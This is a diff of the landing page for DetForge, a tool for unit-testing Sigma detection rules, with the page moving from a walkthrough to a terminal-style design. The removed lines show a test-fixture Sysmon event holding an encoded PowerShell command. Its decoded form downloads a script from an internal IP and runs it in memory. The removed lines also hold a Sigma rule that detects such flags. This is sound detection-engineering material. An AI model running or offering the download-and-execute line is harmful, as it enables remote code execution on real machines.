@@ -4,524 +4,129 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>DetForge</title>
-<meta name="description" content="You wrote a detection rule. Does it still work? Follow one Sigma rule from the attack it was written for to the build that refuses to ship it broken.">
+<meta name="description" content="Unit tests and CI for Sigma detection rules. Eight questions, eight commands, real output. Press enter.">
 <meta property="og:title" content="DetForge">
-<meta property="og:description" content="Unit tests and CI for Sigma detection rules. Follow one rule from attack to merge, with real output.">
+<meta property="og:description" content="Does your detection rule still work? Eight questions, eight commands, real output.">
 <meta property="og:url" content="https://redakarrach.github.io/detforge/">
-<meta property="og:type" content="website">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23ff7a1a'/%3E%3Cpath d='M8 20h16v4H8zM12 8h8v12h-8z' fill='%230e0d0b'/%3E%3C/svg%3E">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%23000'/%3E%3Crect x='6' y='8' width='14' height='3' fill='%23ffb000'/%3E%3Crect x='6' y='14' width='20' height='3' fill='%23ffb000'/%3E%3Crect x='6' y='20' width='10' height='3' fill='%23ffb000'/%3E%3C/svg%3E">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --bg: #0e0d0b; --panel: #16140f; --panel-2: #1e1b14; --line: #2b271f; --line-2: #3a3428;
-    --text: #ebe5da; --muted: #9b9385; --ember: #ff7a1a; --ember-2: #ffb347; --pass: #4fd1a1; --fail: #ff6b6b; --warn: #f5c451;
-    --head: "Space Grotesk", "IBM Plex Sans", -apple-system, "Segoe UI", sans-serif;
-    --body: "IBM Plex Sans", -apple-system, "Segoe UI", Roboto, sans-serif;
-    --mono: "IBM Plex Mono", ui-monospace, Menlo, Consolas, monospace;
-  }
+  :root { --bg: #050604; --amber: #ffb000; --amber-dim: #a87400; --text: #d8d2bd; --dim: #7c7764; --green: #5ff28a; --red: #ff5f5f; --cyan: #7fd7ff; --sel: #1c1708; }
   * { box-sizing: border-box; }
-  html { scroll-behavior: smooth; scroll-padding-top: 64px; -webkit-text-size-adjust: 100%; }
-  body { margin: 0; background: var(--bg); color: var(--text); font-family: var(--body); font-size: 16.5px; line-height: 1.6; -webkit-font-smoothing: antialiased; }
-  a { color: var(--ember-2); text-decoration: none; border-bottom: 1px solid rgba(255,179,71,.35); }
-  a:hover { border-bottom-color: var(--ember-2); }
-  code { font-family: var(--mono); font-size: .88em; background: var(--panel-2); border: 1px solid var(--line); padding: .05em .4em; border-radius: 4px; color: var(--ember-2); }
-  pre { font-family: var(--mono); font-size: 12.5px; line-height: 1.55; margin: 0; white-space: pre-wrap; word-break: break-word; }
-  .wrap { max-width: 860px; margin: 0 auto; padding: 0 20px; min-width: 0; }
-  html, body { overflow-x: hidden; }
-  .card, .q, .cmd, .verdict { min-width: 0; max-width: 100%; }
+  html { scroll-behavior: smooth; }
+  body { margin: 0; background: var(--bg); color: var(--text); font-family: "IBM Plex Mono", ui-monospace, Menlo, Consolas, monospace; font-size: 14px; line-height: 1.5; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
+  body::before { content: ""; position: fixed; inset: 0; pointer-events: none; z-index: 50; background: repeating-linear-gradient(0deg, rgba(0,0,0,.18) 0px, rgba(0,0,0,.18) 1px, transparent 1px, transparent 3px); opacity: .5; }
+  body::after { content: ""; position: fixed; inset: 0; pointer-events: none; z-index: 49; background: radial-gradient(ellipse at center, transparent 55%, rgba(0,0,0,.55) 100%); }
+  a { color: var(--cyan); }
+  pre, .pre { font-family: inherit; margin: 0; white-space: pre-wrap; word-break: break-word; }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 0 16px; min-width: 0; }
 
-  /* top */
-  .top { position: fixed; top: 0; left: 0; right: 0; z-index: 20; background: rgba(14,13,11,.9); backdrop-filter: blur(8px); border-bottom: 1px solid var(--line); }
-  .top .in { height: 52px; display: flex; align-items: center; gap: 14px; }
-  .brand { font-family: var(--head); font-weight: 700; font-size: 19px; color: var(--text); border: 0; display: flex; align-items: center; gap: 9px; letter-spacing: -.01em; }
-  .brand .mark { width: 22px; height: 22px; border-radius: 5px; background: var(--ember); display: inline-grid; place-items: center; }
-  .stop { font-family: var(--mono); font-size: 12px; color: var(--muted); margin-left: auto; }
-  .stop b { color: var(--ember-2); font-weight: 600; }
-  .top .gh { font-size: 13.5px; color: var(--muted); border: 0; }
-  .top .bar { position: absolute; left: 0; right: 0; bottom: -1px; height: 2px; background: var(--line); }
-  .top .bar i { display: block; height: 100%; width: 0; background: var(--ember); transition: width .25s; }
+  .status { position: fixed; top: 0; left: 0; right: 0; z-index: 60; background: var(--amber); color: #1a1200; font-weight: 600; font-size: 12.5px; padding: 4px 0; }
+  .status .wrap { display: flex; gap: 14px; flex-wrap: wrap; align-items: center; }
+  .status .keys { margin-left: auto; font-weight: 400; }
+  .status .keys b { font-weight: 600; }
+  @media (max-width: 640px) { .status .keys { display: none; } }
 
-  /* hero */
-  .hero { padding: 120px 0 56px; position: relative; overflow: hidden; }
-  .hero .glow { position: absolute; width: 640px; height: 640px; right: 0; top: 0; transform: translate(40%, -40%); border-radius: 50%; background: radial-gradient(circle, rgba(255,122,26,.22) 0%, rgba(255,122,26,0) 62%); pointer-events: none; }
-  .kicker { font-family: var(--mono); font-size: 12px; letter-spacing: .14em; text-transform: uppercase; color: var(--ember); margin: 0 0 16px; }
-  h1 { font-family: var(--head); font-weight: 700; font-size: clamp(34px, 6.2vw, 58px); line-height: 1.04; letter-spacing: -.025em; margin: 0 0 18px; max-width: 760px; }
-  h1 span { color: var(--ember-2); }
-  .lede { font-size: 19px; color: var(--muted); max-width: 620px; margin: 0 0 26px; }
-  .btns { display: flex; flex-wrap: wrap; gap: 10px; }
-  .btn { font-family: var(--body); font-size: 14px; font-weight: 600; padding: 11px 16px; border-radius: 8px; border: 1px solid var(--line-2); background: var(--panel); color: var(--text); cursor: pointer; display: inline-block; transition: border-color .15s, background .15s; }
-  .btn:hover { border-color: var(--ember); }
-  .btn.hot { background: var(--ember); border-color: var(--ember); color: #150a02; }
-  .btn.hot:hover { background: var(--ember-2); border-color: var(--ember-2); }
-  .btn:disabled { opacity: .45; cursor: default; }
-  .btn.sm { padding: 7px 12px; font-size: 13px; }
-  .sparks { position: absolute; left: 0; right: 0; top: 0; height: 100%; pointer-events: none; }
-  .sparks i { position: absolute; width: 3px; height: 3px; border-radius: 50%; background: var(--ember-2); opacity: 0; animation: spark 3.4s linear infinite; }
-  @keyframes spark { 0% { transform: translateY(0) scale(1); opacity: 0; } 15% { opacity: .9; } 100% { transform: translateY(-140px) scale(.3); opacity: 0; } }
+  .banner { padding: 56px 0 10px; }
+  .banner pre { color: var(--amber); font-size: clamp(5.4px, 1.65vw, 14px); line-height: 1.15; text-shadow: 0 0 8px rgba(255,176,0,.35); white-space: pre; overflow: hidden; }
+  .tag { color: var(--dim); margin: 10px 0 0; }
+  .tag b { color: var(--text); font-weight: 400; }
+  .intro { margin: 22px 0 10px; }
+  .intro .k { color: var(--amber); }
 
-  /* stations */
-  .station { padding: 56px 0; border-top: 1px solid var(--line); }
-  .num { font-family: var(--mono); font-size: 12px; color: var(--ember); letter-spacing: .14em; margin: 0 0 10px; }
-  h2 { font-family: var(--head); font-weight: 700; font-size: clamp(26px, 4vw, 34px); line-height: 1.12; letter-spacing: -.02em; margin: 0 0 10px; }
-  .sub { color: var(--muted); margin: 0 0 22px; max-width: 640px; }
-  p { margin: 0 0 12px; }
-  .card { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 18px 20px; }
-  .card + .card { margin-top: 12px; }
-  .card .h { font-family: var(--mono); font-size: 11.5px; letter-spacing: .1em; text-transform: uppercase; color: var(--muted); margin-bottom: 12px; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
-  .pill { font-family: var(--mono); font-size: 11px; padding: 2px 8px; border-radius: 999px; border: 1px solid var(--line-2); color: var(--muted); letter-spacing: .04em; }
-  .pill.pass { color: var(--pass); border-color: rgba(79,209,161,.4); }
-  .pill.fail { color: var(--fail); border-color: rgba(255,107,107,.45); }
-  .pill.hot { color: var(--ember-2); border-color: rgba(255,179,71,.45); }
-  .note { color: var(--muted); font-size: 14.5px; }
-  .callout { border-left: 3px solid var(--ember); padding: 6px 0 6px 16px; color: var(--muted); margin: 18px 0; }
-  .callout b { color: var(--text); }
-
-  /* event / fields */
-  .fields { display: grid; grid-template-columns: 150px minmax(0, 1fr); gap: 6px 14px; font-family: var(--mono); font-size: 12.5px; }
-  @media (max-width: 560px) { .fields { grid-template-columns: 1fr; gap: 2px; } .fields dt { margin-top: 8px; } }
-  .fields dt { color: var(--muted); }
-  .fields dd { margin: 0; word-break: break-all; }
-  .fields .b64 { color: var(--warn); }
-  .decoded { margin-top: 14px; padding: 12px 14px; border-radius: 8px; background: #241a10; border: 1px solid rgba(255,122,26,.35); display: none; }
-  .decoded.on { display: block; }
-  .decoded pre { color: var(--ember-2); }
-
-  /* yaml */
-  .yaml { font-family: var(--mono); font-size: 12.5px; line-height: 1.6; white-space: pre-wrap; word-break: break-word; }
-  .yaml .k { color: var(--muted); } .yaml .s { color: var(--ember-2); } .yaml .c { color: #6f6a5f; }
-  .yaml .part { display: block; border-radius: 6px; padding: 2px 8px; margin: 0 -8px; cursor: pointer; border: 1px solid transparent; }
-  .yaml .part:hover, .yaml .part.on { background: var(--panel-2); border-color: var(--line-2); }
-  .explain { margin-top: 12px; padding: 12px 14px; border-radius: 8px; background: var(--panel-2); border: 1px solid var(--line-2); font-size: 14.5px; color: var(--text); min-height: 48px; }
-
-  /* three ways */
-  .ways { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; }
-  .way { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 16px; cursor: pointer; transition: border-color .15s; }
-  .way:hover, .way.on { border-color: var(--ember); }
-  .way h3 { font-family: var(--head); font-size: 16px; margin: 0 0 6px; }
-  .way p { font-size: 14px; color: var(--muted); margin: 0; }
-  .way .more { display: none; margin-top: 10px; font-size: 14px; color: var(--text); }
-  .way.on .more { display: block; }
-  .diff { font-family: var(--mono); font-size: 12.5px; margin: 8px 0; }
-  .diff .del { color: var(--fail); } .diff .add { color: var(--pass); }
-
-  /* checklist */
-  .checks { list-style: none; margin: 0; padding: 0; }
-  .checks li { display: grid; grid-template-columns: 26px 110px minmax(0, 1fr); gap: 10px; align-items: start; padding: 9px 0; border-top: 1px solid var(--line); font-size: 14.5px; }
-  .checks li:first-child { border-top: 0; }
-  @media (max-width: 560px) { .checks li { grid-template-columns: 26px minmax(0, 1fr); } .checks .nm { grid-column: 2; } .checks .ds { grid-column: 2; } }
-  .checks .st { font-family: var(--mono); font-size: 13px; color: var(--muted); }
-  .checks .st.ok { color: var(--pass); }
-  .checks .nm { font-family: var(--mono); font-size: 12.5px; color: var(--ember-2); }
-  .checks .ds { color: var(--muted); }
-  .lintfail { display: none; margin-top: 12px; }
-  .lintfail.on { display: block; }
-  .ltable { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 12px; table-layout: fixed; }
-  .ltable td { word-break: break-word; }
-  .ltable td { padding: 6px 8px; border-top: 1px solid var(--line); vertical-align: top; }
-  .ltable td:nth-child(2) { color: var(--warn); white-space: nowrap; }
-
-  /* rule lab */
-  .lab { display: grid; grid-template-columns: 280px minmax(0, 1fr); gap: 16px; }
-  @media (max-width: 760px) { .lab { grid-template-columns: 1fr; } }
-  .opts { display: flex; flex-direction: column; gap: 8px; }
-  .opt { display: block; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; cursor: pointer; }
-  .opt:hover { border-color: var(--line-2); }
-  .opt input { display: none; }
-  .opt.on { border-color: var(--ember); background: #1b150e; }
-  .opt b { display: block; font-family: var(--head); font-size: 15px; margin-bottom: 2px; }
-  .opt span { font-size: 13px; color: var(--muted); }
-  .res .grp { margin-bottom: 10px; }
-  .res .grp .h { margin-bottom: 8px; }
-  .ev { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 10px; align-items: center; padding: 7px 10px; border-radius: 8px; border: 1px solid var(--line); background: var(--panel); margin-bottom: 6px; font-size: 13.5px; }
-  .ev .d { color: var(--text); }
-  .ev .cl { font-family: var(--mono); font-size: 11.5px; color: var(--muted); word-break: break-all; margin-top: 2px; }
-  .ev.bad { border-color: rgba(255,107,107,.5); background: #221312; }
-  .ev.good { border-color: rgba(79,209,161,.3); }
-  .verdict { font-family: var(--mono); font-size: 12.5px; background: var(--panel-2); border: 1px solid var(--line-2); border-radius: 10px; padding: 12px 14px; margin-top: 8px; }
-  .verdict .row { display: grid; grid-template-columns: minmax(0, 1fr) 60px 70px 100px 70px; gap: 8px; }
-  .verdict .row span:first-child { word-break: break-all; }
-  .verdict .row.hd { color: var(--muted); margin-bottom: 6px; }
-  .verdict .PASS { color: var(--pass); font-weight: 600; } .verdict .FAIL { color: var(--fail); font-weight: 600; }
-  .verdict ul { margin: 10px 0 0; padding-left: 16px; color: var(--fail); }
-  .verdict li { margin: 2px 0; }
-  @media (max-width: 560px) { .verdict .row { grid-template-columns: minmax(0, 1fr) 44px 52px 76px 50px; gap: 6px; font-size: 11px; } .verdict ul { padding-left: 14px; } }
-
-  /* tabs */
-  .tabs { display: inline-flex; border: 1px solid var(--line-2); border-radius: 8px; overflow: hidden; margin-bottom: 12px; }
-  .tabs button { font-family: var(--body); font-size: 13.5px; font-weight: 600; padding: 8px 14px; border: 0; background: transparent; color: var(--muted); cursor: pointer; border-right: 1px solid var(--line-2); }
-  .tabs button:last-child { border-right: 0; }
-  .tabs button[aria-selected="true"] { background: var(--ember); color: #150a02; }
-  .panel { display: none; } .panel.on { display: block; }
-  .q { background: #0a0908; border: 1px solid var(--line); border-radius: 10px; padding: 14px; }
-  .q pre { color: #d9d2c5; }
-  .q .dim { color: #6f6a5f; }
-
-  /* matrix */
-  .matrix { display: grid; grid-template-columns: repeat(14, minmax(0, 1fr)); gap: 4px; }
-  .tactic { display: flex; flex-direction: column; gap: 4px; min-width: 0; }
-  .tactic .t { font-family: var(--mono); font-size: 9px; color: var(--muted); text-align: center; height: 34px; line-height: 1.15; overflow: hidden; word-break: break-word; }
-  .cell { height: 16px; border-radius: 3px; background: var(--panel-2); border: 1px solid var(--line); }
-  .cell.lit { background: var(--ember); border-color: var(--ember-2); cursor: pointer; box-shadow: 0 0 10px rgba(255,122,26,.5); }
-  .cell.lit:hover { background: var(--ember-2); }
-  .legend { font-family: var(--mono); font-size: 12px; color: var(--muted); margin-top: 10px; min-height: 22px; }
-  .legend b { color: var(--ember-2); font-weight: 600; }
-  @media (max-width: 680px) { .matrix { grid-template-columns: repeat(7, minmax(0, 1fr)); } .tactic .t { font-size: 8.5px; } }
-
-  /* CI */
-  .ci { font-size: 14.5px; }
-  .ci .step { display: grid; grid-template-columns: 22px minmax(0, 1fr) auto; gap: 10px; align-items: center; padding: 8px 0; border-top: 1px solid var(--line); }
-  .ci .step:first-child { border-top: 0; }
-  .ci .ic { font-family: var(--mono); color: var(--pass); }
-  .ci .ic.x { color: var(--fail); } .ci .ic.w { color: var(--muted); }
-  .ci .dur { font-family: var(--mono); font-size: 12px; color: var(--muted); }
-  .ci .fails { display: none; font-family: var(--mono); font-size: 12px; color: var(--fail); padding: 6px 0 4px 32px; }
-  .ci .fails.on { display: block; }
-  .merge { margin-top: 14px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
-  .merge .msg { font-size: 14px; color: var(--muted); }
-  .merge .msg.bad { color: var(--fail); }
-
-  /* end */
-  .end { padding: 56px 0 40px; border-top: 1px solid var(--line); }
-  .cols { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
-  .cols h3 { font-family: var(--head); font-size: 16px; margin: 0 0 10px; }
-  .cols ul { margin: 0; padding-left: 18px; color: var(--muted); font-size: 14.5px; }
-  .cols li { margin-bottom: 6px; }
-  .cmd { background: #0a0908; border: 1px solid var(--line); border-radius: 10px; padding: 14px; margin-bottom: 12px; }
-  .cmd pre { color: #d9d2c5; }
-  .cmd .c { color: #6f6a5f; }
-  footer { padding: 24px 0 60px; color: var(--muted); font-size: 13.5px; border-top: 1px solid var(--line); }
-  @media (prefers-reduced-motion: reduce) { .sparks i { animation: none; } html { scroll-behavior: auto; } }
+  .step { margin-top: 28px; padding-top: 18px; border-top: 1px dashed #2a2616; }
+  .q { color: var(--amber); font-weight: 600; font-size: 16px; margin: 0 0 10px; }
+  .q small { color: var(--dim); font-weight: 400; font-size: 12px; display: block; margin-bottom: 4px; letter-spacing: .08em; }
+  .prompt { display: flex; flex-wrap: wrap; align-items: baseline; gap: 0 8px; cursor: pointer; padding: 6px 8px; margin-left: -8px; border-radius: 3px; }
+  .prompt:hover { background: var(--sel); }
+  .ps1 { color: var(--green); }
+  .cmd { color: var(--text); }
+  .cmd.ghost { color: var(--dim); }
+  .hint { color: var(--amber-dim); font-size: 12px; }
+  .cur::after { content: "█"; color: var(--amber); animation: blink 1s steps(1) infinite; margin-left: 1px; }
+  @keyframes blink { 50% { opacity: 0; } }
+  .out { margin: 6px 0 0 0; color: var(--text); overflow-x: auto; }
+  .out .c { color: var(--dim); }
+  .out .g { color: var(--green); } .out .r { color: var(--red); } .out .y { color: var(--amber); } .out .b { color: var(--cyan); }
+  .out .k { color: var(--amber-dim); }
+  .out.box { white-space: pre; }
+  .menu { margin: 10px 0 0; }
+  .menu button { font-family: inherit; font-size: 13.5px; background: transparent; color: var(--cyan); border: 1px solid #214452; border-radius: 3px; padding: 4px 10px; margin: 4px 6px 0 0; cursor: pointer; }
+  .menu button:hover, .menu button.on { background: #0c1a1f; border-color: var(--cyan); }
+  .menu button b { color: var(--amber); font-weight: 600; }
+  .menu .lbl { color: var(--dim); margin-right: 6px; }
+  .next { display: block; margin: 22px 0 0; padding: 12px 10px; text-align: center; color: var(--amber); border: 1px solid var(--amber-dim); border-radius: 4px; cursor: pointer; text-decoration: none; font-weight: 600; letter-spacing: .04em; }
+  .next:hover { background: var(--sel); }
+  .next .arrow { display: block; font-size: 26px; line-height: 1; margin-bottom: 4px; animation: bob 1.4s ease-in-out infinite; }
+  @keyframes bob { 50% { transform: translateY(5px); } }
+  .hidden { display: none; }
+  .yaml .part { display: inline; cursor: pointer; border-radius: 2px; }
+  .yaml .part:hover, .yaml .part.on { background: var(--sel); outline: 1px solid var(--amber-dim); }
+  .fin { padding: 40px 0 70px; color: var(--dim); }
+  .fin a { color: var(--cyan); }
+  @media (prefers-reduced-motion: reduce) { .cur::after, .next .arrow { animation: none; } html { scroll-behavior: auto; } body::before { display: none; } }
 </style>
 </head>
 <body>
 
-<div class="top">
-  <div class="wrap in">
-    <a class="brand" href="#top"><span class="mark"><svg width="13" height="13" viewBox="0 0 32 32"><path d="M8 20h16v4H8zM12 8h8v12h-8z" fill="#0e0d0b"/></svg></span>DetForge</a>
-    <span class="stop" id="stop">stop <b>00</b> / 08</span>
-    <a class="gh" href="https://github.com/RedaKarrach/detforge">GitHub</a>
-    <div class="bar"><i id="bar"></i></div>
-  </div>
-</div>
+<div class="status"><div class="wrap"><span>DETFORGE</span><span id="prog">[----------] Q0/8</span><span class="keys"><b>enter</b> run &nbsp; <b>↓</b> next &nbsp; <b>1-9</b> choose &nbsp; <b>r</b> restart</span></div></div>
 
-<section class="hero" id="top">
-  <div class="glow"></div>
-  <div class="sparks" aria-hidden="true">
-    <i style="left:78%;top:60%;animation-delay:0s"></i><i style="left:84%;top:55%;animation-delay:.7s"></i><i style="left:72%;top:62%;animation-delay:1.3s"></i><i style="left:90%;top:58%;animation-delay:2s"></i><i style="left:81%;top:66%;animation-delay:2.6s"></i><i style="left:76%;top:52%;animation-delay:1.8s"></i>
+<div class="wrap">
+  <div class="banner" id="top">
+<pre> ____  _____ _____ _____ ___  ____   ____ _____
+|  _ \| ____|_   _|  ___/ _ \|  _ \ / ___| ____|
+| | | |  _|   | | | |_ | | | | |_) | |  _|  _|
+| |_| | |___  | | |  _|| |_| |  _ &lt;| |_| | |___
+|____/|_____| |_| |_|   \___/|_| \_\\____|_____|</pre>
+    <p class="tag"><b>unit tests and CI for Sigma detection rules</b> · MIT · <a href="https://github.com/RedaKarrach/detforge">github.com/RedaKarrach/detforge</a></p>
+    <p class="intro">Eight questions. Each one has a command. Run it, read the output, take the arrow down to the next one. Every line of output on this page came from running DetForge on its own repository. The one part that runs live is the test harness: here it runs on the repository's real test events, in your browser.<br><br><span class="k">Press enter, or tap the command line, to run the first one.</span></p>
   </div>
-  <div class="wrap">
-    <p class="kicker">Detection rules, treated like code</p>
-    <h1>You wrote a detection rule. <span>Does it still work?</span></h1>
-    <p class="lede">Follow one Sigma rule from the attack it was written for to the build that refuses to ship it broken. Eight stops. Every output below is real, and the rule lab in the middle runs the real test events.</p>
-    <div class="btns">
-      <a class="btn hot" href="#s1">Start at the attack</a>
-      <a class="btn" href="#s5">Jump to the rule lab</a>
-      <a class="btn" href="#end">Just give me the commands</a>
-    </div>
-  </div>
-</section>
 
-<section class="station" id="s1" data-stop="01">
-  <div class="wrap">
-    <p class="num">STOP 01</p>
-    <h2>The attack</h2>
-    <p class="sub">A user opens a document. A moment later, Sysmon writes this. One process-creation event among thousands that hour.</p>
-    <div class="card">
-      <div class="h">Sysmon event 1 · process creation <span class="pill hot">from the test fixtures</span></div>
-      <dl class="fields">
-        <dt>Image</dt><dd>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</dd>
-        <dt>ParentImage</dt><dd>C:\Windows\System32\cmd.exe</dd>
-        <dt>User</dt><dd>CORP\jdoe</dd>
-        <dt>CommandLine</dt><dd>powershell.exe -nop -w hidden -e <span class="b64">SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1AC8AYQAuAHAAcwAxACIAKQA=</span></dd>
-      </dl>
-      <div class="btns" style="margin-top:14px"><button class="btn sm" id="decode">Decode the command</button></div>
-      <div class="decoded" id="decoded">
-        <pre>IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/a.ps1")</pre>
-        <p class="note" style="margin:8px 0 0">Downloads a script from another machine and runs it in memory. Nothing is written to disk. The <code>-e</code> is the short form of <code>-EncodedCommand</code>; the base64 is UTF-16, which is why it looks like that.</p>
-      </div>
-    </div>
-    <p class="callout"><b>Why attackers do this:</b> an encoded command hides what is being run from anyone glancing at a process list, and it avoids quoting problems in one-liners. It is MITRE ATT&amp;CK T1059.001.</p>
-  </div>
-</section>
+  <div id="steps"></div>
 
-<section class="station" id="s2" data-stop="02">
-  <div class="wrap">
-    <p class="num">STOP 02</p>
-    <h2>The rule</h2>
-    <p class="sub">An analyst writes it in Sigma, the vendor-neutral format for detections. Click a part to see what it is for.</p>
-    <div class="card">
-      <div class="h">rules/windows/execution/powershell_encoded_command.yml</div>
-      <div class="yaml">
-<span class="k">title:</span> PowerShell Encoded Command Execution
-<span class="k">tags:</span> [<span class="s">attack.execution</span>, <span class="s">attack.t1059.001</span>]
-<span class="k">logsource:</span> { <span class="k">product:</span> <span class="s">windows</span>, <span class="k">category:</span> <span class="s">process_creation</span> }
-<span class="k">detection:</span>
-<span class="part" data-x="img">  selection_img:
-    - Image|endswith: [<span class="s">'\powershell.exe'</span>, <span class="s">'\pwsh.exe'</span>]
-    - OriginalFileName: [<span class="s">'PowerShell.EXE'</span>, <span class="s">'pwsh.dll'</span>]</span>
-<span class="part" data-x="cli">  selection_cli:
-    CommandLine|windash|contains:
-      - <span class="s">' -e '</span>
-      - <span class="s">' -ec '</span>
-      - <span class="s">' -enc '</span>
-      <span class="c"># ... every abbreviation up to ' -encodedcommand '</span></span>
-<span class="part" data-x="cond">  condition: all of selection_*</span>
-<span class="k">level:</span> <span class="s">high</span>
-      </div>
-      <div class="explain" id="explain">Click <code>selection_img</code>, <code>selection_cli</code> or the <code>condition</code>.</div>
-    </div>
-  </div>
-</section>
+  <div class="fin hidden" id="fin">
+    <div class="step">
+      <p class="q"><small>END OF TRANSMISSION</small>Run it yourself.</p>
+      <pre class="out"><span class="ps1">$</span> git clone https://github.com/RedaKarrach/detforge.git
+<span class="ps1">$</span> cd detforge
+<span class="ps1">$</span> python -m venv .venv && .venv\Scripts\activate   <span class="c"># Linux/macOS: source .venv/bin/activate</span>
+<span class="ps1">$</span> pip install -e ".[dev]"
+<span class="ps1">$</span> detforge lint --offline
+<span class="ps1">$</span> detforge test
+<span class="ps1">$</span> detforge convert --target all
+<span class="ps1">$</span> detforge coverage
+<span class="ps1">$</span> detforge report
 
-<section class="station" id="s3" data-stop="03">
-  <div class="wrap">
-    <p class="num">STOP 03</p>
-    <h2>The question nobody asks</h2>
-    <p class="sub">The rule gets pasted into the SIEM and forgotten. Here are three quiet ways it dies. None of them throws an error. The dashboard stays green. Click one.</p>
-    <div class="ways">
-      <div class="way" tabindex="0">
-        <h3>Someone tidies the quotes</h3>
-        <p>A well-meaning edit removes the spaces around the flags.</p>
-        <div class="more">
-          <div class="diff"><span class="del">- ' -enc '</span><br><span class="add">+ '-enc'</span></div>
-          <code>-enc</code> is now also inside <code>-Encoding</code>. Every <code>Out-File -Encoding utf8</code> in the company pages the on-call. By Friday the rule is disabled.
-        </div>
-      </div>
-      <div class="way" tabindex="0">
-        <h3>PowerShell 7 arrives</h3>
-        <p>The first version of the rule only knew <code>powershell.exe</code>.</p>
-        <div class="more">Developers install PowerShell 7. Its binary is <code>pwsh.exe</code>. The attacker uses it too. The rule never fires again, and nobody notices, because a rule that never fires looks exactly like a rule that is working.</div>
-      </div>
-      <div class="way" tabindex="0">
-        <h3>The agent renames a field</h3>
-        <p>A logging upgrade changes <code>CommandLine</code> to <code>process.command_line</code>.</p>
-        <div class="more">The query still runs. It matches nothing, forever. There is no error to catch, only an absence.</div>
-      </div>
-    </div>
-    <p class="callout" style="margin-top:22px"><b>This is the gap DetForge fills.</b> Code has unit tests that fail loudly when behaviour changes. Detection rules usually do not. So give them some.</p>
-  </div>
-</section>
-
-<section class="station" id="s4" data-stop="04">
-  <div class="wrap">
-    <p class="num">STOP 04</p>
-    <h2>Lint: is the rule even well formed?</h2>
-    <p class="sub">Before anything runs against events, <code>detforge lint</code> checks the file the way a code linter would. These are the real check names.</p>
-    <div class="card">
-      <div class="h">detforge lint --offline <span class="pill" id="lintpill">not run</span></div>
-      <ul class="checks" id="checks">
-        <li><span class="st">·</span><span class="nm">filename</span><span class="ds">snake_case, ends in .yml, lives in rules/windows/&lt;tactic&gt;/</span></li>
-        <li><span class="st">·</span><span class="nm">layout</span><span class="ds">the folder name matches one of the rule's tactic tags</span></li>
-        <li><span class="st">·</span><span class="nm">required-field</span><span class="ds">title, id, status, description, author, date, logsource, detection, falsepositives, level, tags</span></li>
-        <li><span class="st">·</span><span class="nm">tags</span><span class="ds">at least one ATT&amp;CK technique tag and one tactic tag</span></li>
-        <li><span class="st">·</span><span class="nm">fixtures</span><span class="ds">tp.jsonl and tn.jsonl exist for the rule's id, with at least 2 events each</span></li>
-        <li><span class="st">·</span><span class="nm">pySigma</span><span class="ds">the standard Sigma validators (and the MITRE tag validators when online)</span></li>
-      </ul>
-      <div class="btns" style="margin-top:14px">
-        <button class="btn sm hot" id="runlint">Run lint</button>
-        <button class="btn sm" id="showlintfail">Show a failing run</button>
-      </div>
-      <div class="lintfail" id="lintfail">
-        <p class="note" style="margin:0 0 8px">A folder of deliberately broken rules, from the repository's own tests:</p>
-        <table class="ltable">
-          <tr><td>BadlyNamedRule.yml</td><td>filename</td><td>file name must be snake_case and end in .yml</td></tr>
-          <tr><td>BadlyNamedRule.yml</td><td>layout</td><td>folder 'execution' does not match any tactic tag</td></tr>
-          <tr><td>missing_tactic_tag.yml</td><td>tags</td><td>needs an ATT&amp;CK tactic tag (attack.&lt;tactic&gt;)</td></tr>
-          <tr><td>tests/fixtures/71ed6c38-…/tp.jsonl</td><td>fixtures</td><td>missing tp.jsonl for this rule</td></tr>
-        </table>
-        <p class="note" style="margin:8px 0 0"><code>lint: 8 issue(s)</code>, exit code 1. The build stops here.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section class="station" id="s5" data-stop="05">
-  <div class="wrap">
-    <p class="num">STOP 05</p>
-    <h2>The rule lab: change the rule, watch the tests</h2>
-    <p class="sub">This is <code>detforge test</code>, running in your browser on the repository's real fixture events. Every rule ships with events it must match, near-miss events it must not match, and a shared baseline of normal activity that no rule may match. Pick a version of the rule.</p>
-    <div class="lab">
-      <div class="opts" id="opts">
-        <label class="opt on"><input type="radio" name="v" value="full" checked><b>The rule as written</b><span>PowerShell binary AND an encoded-command flag with spaces around it</span></label>
-        <label class="opt"><input type="radio" name="v" value="img"><b>Only "is it PowerShell"</b><span>Someone deleted the flag check to "simplify" it</span></label>
-        <label class="opt"><input type="radio" name="v" value="strict"><b>Only the full spelling</b><span>Matches -EncodedCommand but none of the 14 abbreviations</span></label>
